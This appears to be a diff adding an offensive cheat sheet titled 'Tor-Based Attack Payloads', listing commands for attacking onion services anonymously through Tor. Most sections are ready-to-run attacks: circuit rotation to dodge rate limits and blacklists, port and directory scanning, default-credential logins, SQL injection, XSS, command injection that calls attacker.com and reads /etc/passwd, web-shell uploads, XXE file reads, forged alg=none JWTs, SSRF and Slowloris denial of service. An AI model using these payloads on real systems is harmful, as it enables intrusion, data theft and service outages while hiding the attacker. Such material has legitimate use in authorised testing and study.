@@ -1,0 +1,444 @@
+# Tor-Based Attack Payloads
+
+# ============================================
+# 1. TOR CONNECTION SETUP
+# ============================================
+
+# Tor SOCKS proxy configuration
+SOCKS_PROXY=socks5h://127.0.0.1:9050
+HTTP_PROXY=http://127.0.0.1:8118  # Polipo/Privoxy
+
+# Test Tor connection
+curl --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/
+curl --socks5-hostname 127.0.0.1:9050 https://icanhazip.com
+
+# ============================================
+# 2. TOR EXIT NODE LIST CHECKING
+# ============================================
+
+# Get Tor exit node list
+curl https://check.torproject.org/torbulkexitlist
+
+# Check if IP is Tor exit node
+curl "https://check.torproject.org/cgi-bin/TorBulkExitList.py?ip=TARGET_IP"
+
+# DNS-based Tor exit node check
+# Query: REVERSE_IP.REVERSE_TARGET_IP.ip-port.exitlist.torproject.org
+# Example: dig 1.0.0.127.80.1.0.168.192.ip-port.exitlist.torproject.org
+
+# ============================================
+# 3. RATE LIMITING BYPASS
+# ============================================
+
+# Rotate Tor circuits for new IP
+# Using stem library
+# controller.signal(Signal.NEWNYM)
+
+# Automated requests with circuit rotation
+# Request 1-10 with IP A
+# Rotate circuit (get new IP)
+# Request 11-20 with IP B
+# Continue...
+
+# Testing rate limits
+for i in {1..100}; do
+  curl --socks5-hostname 127.0.0.1:9050 https://example.com/api/endpoint
+  # Rotate every 10 requests
+  if [ $((i % 10)) -eq 0 ]; then
+    killall -HUP tor
+    sleep 5
+  fi
+done
+
+# ============================================
+# 4. ONION SERVICE ENUMERATION
+# ============================================
+
+# Common onion service patterns
+http://*.onion
+http://*.onion/admin
+http://*.onion/login
+http://*.onion/panel
+http://*.onion/api
+
+# Known onion services for testing
+http://3g2upl4pq6kufc4m.onion (DuckDuckGo)
+http://thehiddenwiki.onion
+http://darknetlive.onion
+
+# Subdirectory enumeration
+/admin
+/panel
+/dashboard
+/api
+/login
+/register
+/upload
+/download
+/files
+
+# ============================================
+# 5. ONION SERVICE SCANNING
+# ============================================
+
+# Port scanning through Tor
+proxychains nmap -sT -Pn -p 80,443,8080 example.onion
+
+# Service detection
+proxychains nmap -sV -p 80 example.onion
+
+# Directory bruteforce
+gobuster dir --proxy socks5://127.0.0.1:9050 -u http://example.onion -w wordlist.txt
+
+# Nikto scan
+proxychains nikto -h http://example.onion
+
+# ============================================
+# 6. TOR BROWSER FINGERPRINTING EVASION
+# ============================================
+
+# Tor Browser User-Agent strings
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+# Standard Tor Browser headers
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+# ============================================
+# 7. HIDDEN SERVICE AUTHENTICATION TESTING
+# ============================================
+
+# Test default credentials on onion services
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/login -d "username=admin&password=admin"
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/login -d "username=admin&password=password"
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/login -d "username=administrator&password=administrator"
+
+# Authentication bypass attempts
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/admin
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/admin -H "Authorization: Bearer null"
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/admin -H "Cookie: admin=true"
+
+# ============================================
+# 8. SSRF TO INTERNAL ONION SERVICES
+# ============================================
+
+# SSRF payloads targeting onion services
+url=http://internal.onion
+url=http://admin.onion
+url=http://localhost.onion
+url=http://192.168.1.1.onion
+
+# Testing internal onion service access
+{"webhook_url": "http://internal.onion/api"}
+{"callback": "http://admin-panel.onion"}
+
+# ============================================
+# 9. SQL INJECTION ON ONION SERVICES
+# ============================================
+
+# Test SQLi through Tor
+curl --socks5-hostname 127.0.0.1:9050 "http://example.onion/page?id=1' OR '1'='1"
+curl --socks5-hostname 127.0.0.1:9050 "http://example.onion/search?q=test' UNION SELECT NULL--"
+
+# Automated SQLi testing
+sqlmap -u "http://example.onion/page?id=1" --tor --tor-type=SOCKS5 --check-tor
+
+# ============================================
+# 10. XSS ON ONION SERVICES
+# ============================================
+
+# XSS payloads for onion services
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(document.cookie)>
+<svg/onload=alert(1)>
+
+# Reflected XSS testing
+curl --socks5-hostname 127.0.0.1:9050 "http://example.onion/search?q=<script>alert(1)</script>"
+
+# ============================================
+# 11. COMMAND INJECTION ON ONION SERVICES
+# ============================================
+
+# Command injection payloads
+; whoami
+| ls -la
+` cat /etc/passwd`
+$(curl attacker.com)
+
+# Testing command injection
+curl --socks5-hostname 127.0.0.1:9050 "http://example.onion/ping?host=127.0.0.1; whoami"
+
+# ============================================
+# 12. FILE UPLOAD ON ONION SERVICES
+# ============================================
+
+# Upload malicious files through Tor
+curl --socks5-hostname 127.0.0.1:9050 -F "file=@shell.php" http://example.onion/upload
+curl --socks5-hostname 127.0.0.1:9050 -F "file=@backdoor.jsp" http://example.onion/upload
+
+# ============================================
+# 13. TOR CIRCUIT MANIPULATION
+# ============================================
+
+# Request specific exit nodes
+# In torrc:
+ExitNodes {US}
+StrictNodes 1
+
+# Avoid specific exit nodes
+ExcludeExitNodes {CN},{RU}
+
+# Use specific entry guards
+EntryNodes $fingerprint1,$fingerprint2
+
+# ============================================
+# 14. TIMING ATTACKS THROUGH TOR
+# ============================================
+
+# Measure response times for timing attacks
+for i in {1..100}; do
+  TIME=$(curl --socks5-hostname 127.0.0.1:9050 -w "%{time_total}" -o /dev/null -s "http://example.onion/login?user=admin")
+  echo "Request $i: $TIME seconds"
+done
+
+# ============================================
+# 15. ONION SERVICE DOS
+# ============================================
+
+# Stress testing onion service
+ab -X 127.0.0.1:8118 -n 10000 -c 100 http://example.onion/
+
+# Slowloris through Tor
+slowloris --proxy 127.0.0.1:9050 example.onion
+
+# ============================================
+# 16. EXIT NODE DETECTION BYPASS
+# ============================================
+
+# Rotate circuits to bypass blacklists
+# After each blocked request, get new circuit
+killall -HUP tor
+sleep 5
+# Retry request
+
+# Use bridges to hide Tor usage
+# In torrc:
+UseBridges 1
+Bridge obfs4 IP:PORT FINGERPRINT
+
+# ============================================
+# 17. ONION SERVICE DISCOVERY
+# ============================================
+
+# Search for onion services
+# Ahmia.fi search API
+curl "https://ahmia.fi/search/?q=keyword"
+
+# Dark web search engines
+# notEvil: http://hss3uro2hsxfogfq.onion
+# Torch: http://xmh57jrzrnw6insl.onion
+
+# ============================================
+# 18. HIDDEN SERVICE DESCRIPTOR ATTACKS
+# ============================================
+
+# Query hidden service descriptor
+# HSDir servers store descriptors
+# Descriptor ID calculated from onion address
+
+# Monitor descriptor uploads
+# Timing analysis on descriptor publication
+
+# ============================================
+# 19. TOR BROWSER EXPLOIT TESTING
+# ============================================
+
+# JavaScript exploits targeting Tor Browser
+<script>
+// Attempt to detect Tor Browser
+if (navigator.userAgent.includes('Firefox')) {
+  // Tor Browser specific behavior
+}
+
+// Canvas fingerprinting (blocked in Tor Browser)
+var canvas = document.createElement('canvas');
+// Will return generic fingerprint in Tor Browser
+</script>
+
+# ============================================
+# 20. ONION SERVICE API TESTING
+# ============================================
+
+# API endpoint enumeration
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/api/v1/
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/api/v2/
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/api/users
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/api/admin
+
+# GraphQL on onion services
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{types{name}}}"}'
+
+# ============================================
+# 21. TOR BRIDGE ENUMERATION
+# ============================================
+
+# Request bridges from BridgeDB
+curl https://bridges.torproject.org/
+
+# Test bridge connectivity
+# In torrc:
+UseBridges 1
+Bridge obfs4 BRIDGE_IP:PORT FINGERPRINT cert=CERT iat-mode=0
+
+# ============================================
+# 22. ONION SERVICE CORS MISCONFIGURATION
+# ============================================
+
+# Test CORS on onion services
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/api \
+  -H "Origin: http://attacker.onion"
+
+# Check CORS headers
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+
+# ============================================
+# 23. WEBSOCKET ON ONION SERVICES
+# ============================================
+
+# WebSocket connections through Tor
+wscat --proxy socks5://127.0.0.1:9050 -c ws://example.onion/ws
+
+# Test WebSocket security
+{"type":"auth","token":"' OR '1'='1"}
+
+# ============================================
+# 24. ONION SERVICE IDOR
+# ============================================
+
+# Test IDOR on onion services
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/api/user/1
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/api/user/2
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/api/user/999
+
+# ============================================
+# 25. TOR CONSENSUS MANIPULATION
+# ============================================
+
+# Download Tor consensus
+curl https://collector.torproject.org/recent/relay-descriptors/consensuses/
+
+# Analyze relay information
+# Identify potential malicious relays
+
+# ============================================
+# 26. ONION SERVICE JWT ATTACKS
+# ============================================
+
+# Test JWT on onion services
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/api \
+  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."
+
+# JWT weak secret
+# Brute force JWT secret on onion service
+
+# ============================================
+# 27. ONION SERVICE XXE
+# ============================================
+
+# XXE payload for onion services
+curl --socks5-hostname 127.0.0.1:9050 http://example.onion/api \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+
+# ============================================
+# 28. ONION SERVICE SSRF
+# ============================================
+
+# SSRF payloads targeting internal onion services
+{"url": "http://internal.onion"}
+{"url": "http://127.0.0.1:9050"}
+{"url": "http://localhost"}
+
+# ============================================
+# 29. TOR DIRECTORY AUTHORITY MONITORING
+# ============================================
+
+# Monitor directory authorities
+# 9 directory authorities in Tor network
+# moria1, tor26, dizum, gabelmoo, maatuska, longclaw, bastet, faravahar, Serge
+
+# Query directory authority
+curl http://128.31.0.34:9131/tor/status-vote/current/consensus
+
+# ============================================
+# 30. ONION SERVICE SECURITY HEADERS
+# ============================================
+
+# Check security headers on onion services
+curl --socks5-hostname 127.0.0.1:9050 -I http://example.onion
+
+# Missing security headers:
+# Strict-Transport-Security
+# X-Content-Type-Options
+# X-Frame-Options
+# Content-Security-Policy
+
+# ============================================
+# PYTHON TOR AUTOMATION EXAMPLES
+# ============================================
+
+# Python with Tor SOCKS proxy
+import requests
+
+proxies = {
+    'http': 'socks5h://127.0.0.1:9050',
+    'https': 'socks5h://127.0.0.1:9050'
+}
+
+response = requests.get('http://example.onion', proxies=proxies)
+
+# Python with Stem (Tor controller)
+from stem import Signal
+from stem.control import Controller
+
+with Controller.from_port(port=9051) as controller:
+    controller.authenticate()
+    controller.signal(Signal.NEWNYM)  # New identity
+
+# ============================================
+# BASH TOR AUTOMATION EXAMPLES
+# ============================================
+
+# Rotate Tor identity
+killall -HUP tor
+
+# Check current Tor IP
+curl --socks5-hostname 127.0.0.1:9050 https://icanhazip.com
+
+# Automated onion service scanner
+#!/bin/bash
+ONIONS=("example1.onion" "example2.onion" "example3.onion")
+for onion in "${ONIONS[@]}"; do
+  echo "Scanning $onion"
+  proxychains nmap -sT -Pn -p 80,443 $onion
+  proxychains nikto -h http://$onion
+done
+
+# ============================================
+# TOR CIRCUIT INFORMATION
+# ============================================
+
+# Get current circuit info
+# Using Tor control port (9051)
+echo -e 'AUTHENTICATE ""\r\nGETINFO circuit-status\r\nQUIT' | nc 127.0.0.1 9051
+
+# Monitor circuit creation
+# Using stem library to get real-time circuit events
